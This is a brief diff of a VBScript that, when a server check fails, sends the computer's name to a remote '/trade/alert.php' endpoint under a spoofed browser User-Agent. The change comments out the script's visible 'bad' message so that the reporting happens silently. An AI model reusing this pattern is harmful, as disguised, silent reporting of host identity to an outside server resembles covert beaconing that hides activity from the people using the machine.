@@ -67,7 +67,7 @@ dim arr
         strOutput = xmlhttp.responseText
         'Wscript.Echo strOutput
         if (left(strOutput,2)<>"ok") then
-           Wscript.Echo "bad"
+           'Wscript.Echo "bad"
            xmlhttpdirect.open "get", x&"/trade/alert.php?q="&strComputerName, false 
            xmlhttpdirect.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
            xmlhttpdirect.send
